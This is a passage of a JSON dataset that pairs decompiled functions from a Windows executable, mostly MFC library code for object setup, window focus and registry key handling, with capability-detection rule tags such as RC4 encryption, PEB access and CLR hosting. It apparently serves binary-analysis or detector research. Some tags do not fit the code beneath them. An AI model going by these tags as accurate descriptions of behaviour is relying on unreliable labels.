        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.0042dd8c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    uVar2 = *(pcVar1 + 4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041ae3c(uVar2, 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.00428058(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.00428058(4);\n    *(unaff_EBP + -4) = 2;\n    fcn.00427e9c(7, 0);\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    pcVar3 = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    extraout_ECX[0x17] = pcVar3;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 457
    },
    "0043033c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0043033c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    code *extraout_ECX_00;\n    code *pcVar3;\n    code *extraout_EDX;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042d958();\n    pcVar4 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    pcVar3 = *(unaff_EBP + 0xc);\n    *extraout_ECX = vtable.CMemFile.0;\n    if ((pcVar4 == NULL) && (pcVar3 != NULL)) {\n        fcn.004275b6();\n        pcVar3 = extraout_ECX_00;\n        pcVar4 = extraout_EDX;\n    }\n    pcVar1 = *(unaff_EBP + 0x10);\n    extraout_ECX[5] = NULL;\n    extraout_ECX[4] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[6] = pcVar3;\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[7] = ~-(pcVar1 != NULL) & pcVar3;\n    extraout_ECX[8] = pcVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 412
    },
    "004305ae": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004305ae(int32_t *param_1)\n\n{\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    if ((param_1[8] != 0) && (param_1[9] != 0)) {\n        (**(*param_1 + 0x60))(param_1[8]);\n    }\n    param_1[8] = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "004306a7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004306a7(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMemFile.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.004305ae();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    fcn.0042d997();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 256
    },
    "00431938": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00431938(code **param_1, uchar param_2)\n\n{\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 238
    },
    "00434255": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434255(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.COleDispatchException.0;\n    fcn.004011b0();\n    fcn.004011b0();\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00427a9b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427a9b(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00427e86();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "00427509": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427509(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.004281df(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 96
    },
    "00427ee8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427ee8(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.00428fdc(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.00427e86();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 121
    },
    "0042f2da": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0042f2da(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint hWnd;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x1c);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.0042f11f(uVar2);\n    if (iVar3 == 0) {\n        fcn.0042ed53();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 343
    },
    "004320f3": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004320f3(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00430957();\n    return param_1;\n}\n",
        "token_count": 144
    },
    "00433854": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00433854(code **param_1, code *param_2, code *param_3, code *param_4, code *param_5)\n\n{\n    fcn.00428b07();\n    *param_1 = vtable.CEnumArray.0;\n    param_1[0xd] = vtable.CEnumArray::XEnumVOID.0;\n    param_1[8] = NULL;\n    param_1[10] = NULL;\n    param_1[7] = param_2;\n    param_1[0xb] = param_4;\n    param_1[9] = param_3;\n    param_1[0xc] = param_5;\n    return param_1;\n}\n",
        "token_count": 164
    },
    "00431612": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** fcn.00431612(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00428b07();\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CWinThread.0;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    fcn.004315b9();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 195
    },
    "0041ad86": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ad86(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.0041ad26(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "004274d3": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.004274d3(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0042852f();\n    iVar3 = fcn.00431a51();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.00432ecd(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x90))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != 0) {\n                (**(*piVar2[7] + 0x60))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.00434bea();\n    return uVar4;\n}\n",
        "token_count": 292
    },
    "00432ac8": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00432ac8(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x50), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 100), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 379
    },
    "00431332": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00431332(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint lpSubKey)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint hKey;\n    uint var_ch_2;\n    uint var_14h;\n    uint var_10h;\n    uint phkResult;\n    uint var_120h;\n    uint var_11ch;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint in_stack_ffffff98;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x14) = *0x444220;\n    uVar1 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x10) = &phkResult;\n    phkResult = unaff_EDI;\n    var_120h = unaff_ESI;\n    var_11ch = unaff_EBX;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(*(unaff_EBP + 8), uVar1, unaff_EBP + -0x124);\n    if (iVar2 == 0) {\n        while( true ) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(*(unaff_EBP + -0x124), 0, unaff_EBP + -0x11c, 0x104);\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = unaff_EBP + -0x11c;\n            fcn.00401cd0();\n            *(unaff_EBP + -4) = 1;\n            iVar2 = fcn.00431332(*(unaff_EBP + -0x124), unaff_EBP + -0x120, iVar2, phkResult, var_120h, var_11ch, \n                                 in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0, \n                                 in_stack_fffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, \n                                 in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                                 in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, in_stack_ffffff20, \n                                 in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, in_stack_ffffff30, \n                                 in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                                 in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, \n                                 in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                                 in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, \n                                 in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, \n                                 in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                 in_stack_ffffff94, in_stack_ffffff98, in_stack_ffffff9c, in_stack_ffffffa0, \n                                 in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, \n                                 in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                                 in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, in_stack_ffffffe0, \n                                 in_stack_ffffffe4, var_14h_2, in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h);\n            *(unaff_EBP + -4) = 0;\n            fcn.004011b0();\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        if ((iVar2 == 0x103) || (iVar2 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(*(unaff_EBP + 8), **(unaff_EBP + 0xc));\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x124));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 2232
    },
    "00432b59": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00432b59(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00432ac8();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 165
    },
    "00401000": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401000(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    do {\n        iVar1 = fcn.0041aefd();\n    } while (iVar1 % param_1 == *param_2);\n    *param_2 = iVar1 % param_1;\n    return;\n}\n",
        "token_count": 80
    },
    "00401a60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401a60(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00401560(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401560(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 130
    },
    "00401c50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00401c50(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_2 == NULL) {\n        fcn.00401560(0, 0);\n        return param_1;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401560(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 144
    },
    "00401c90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00401c90(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_2 == NULL) {\n        fcn.004018f0(0, 0);\n        return param_1;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004018f0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 146
    },
    "00413c4f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00413c4f(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar2;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumUnknown.0;\n    pcVar2 = NULL;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) && (pcVar1 = extraout_ECX[9],  extraout_ECX[0xb] != NULL)) {\n        do {\n            (**(**(pcVar1 + pcVar2 * 4) + 8))(*(pcVar1 + pcVar2 * 4));\n            pcVar2 = pcVar2 + 1;\n        } while (pcVar2 < extraout_ECX[0xb]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004335f9();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 336
    },
    "00417459": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417459(uint *arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint32_t uVar1;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = 0;\n    if (in_ECX[1] != 0) {\n        var_4h = in_ECX;\n        fcn.00417188();\n        var_8h = (***arg_8h)(arg_8h, 0x439f94, &var_4h);\n        if ((-1 < var_8h) && (uVar1 = 0,  in_ECX[1] != 0)) {\n            do {\n                (**(*var_4h + 0x18))(var_4h, *(*in_ECX + uVar1 * 8), 0);\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < in_ECX[1]);\n        }\n        in_ECX[1] = 0;\n        fcn.00428fdc(*in_ECX);\n        *in_ECX = 0;\n        fcn.004161bf();\n    }\n    return var_8h;\n}\n",
        "token_count": 275
    },
    "00417c6e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00417c6e(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar2 = 0;\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        do {\n            iVar2 = fcn.004171c2();\n            if (iVar2 < 0) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 154
    },
    "0041a22c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041a22c(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar4 = 0;\n    iVar5 = iVar4;\n    if (param_2 != 0) {\n        do {\n            iVar5 = param_2;\n            uVar2 = (*pcVar1)(*(iVar5 + 0x1c), 0xfffffff0);\n            if ((uVar2 & 0xc0000000) != 0x40000000) {\n                return iVar4;\n            }\n            if (iVar5 == unaff_EBX) {\n                return iVar4;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar5 + 0x1c));\n            param_2 = fcn.0042aeb1(uVar3);\n            uVar2 = (*pcVar1)(*(param_2 + 0x1c), 0xffffffec);\n            iVar4 = iVar5;\n        } while ((uVar2 & 0x10000) == 0);\n    }\n    return iVar5;\n}\n",
        "token_count": 298
    },
    "0041a594": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a594(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if (param_1 != 0) {\n        piVar4 = NULL;\n        iVar3 = param_1;\n        do {\n            iVar1 = *(iVar3 + 0x48);\n            if ((iVar1 != 0) || (piVar4 = *(iVar3 + 0x4c),  piVar4 != NULL)) break;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar3 + 0x1c));\n            iVar3 = fcn.0042aeb1(uVar2);\n        } while (iVar3 != 0);\n        if ((iVar3 != 0) && (iVar1 == 0)) {\n            (**(*piVar4 + 0xb0))();\n            uVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = fcn.0042aeb1(uVar2);\n            if ((iVar3 != param_1) && (iVar3 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c)),  iVar3 != 0)) {\n                if (*(param_1 + 0x4c) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042cf9a. Too many branches\n    // WARNING: Treating indirect jump as call\n                    (**(**(param_1 + 0x4c) + 0xb0))();\n                    return;\n                }\n                uVar2 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n                fcn.0042aeb1(uVar2);\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0041a601": {
        "rules": [
            "contain loop"
        ],
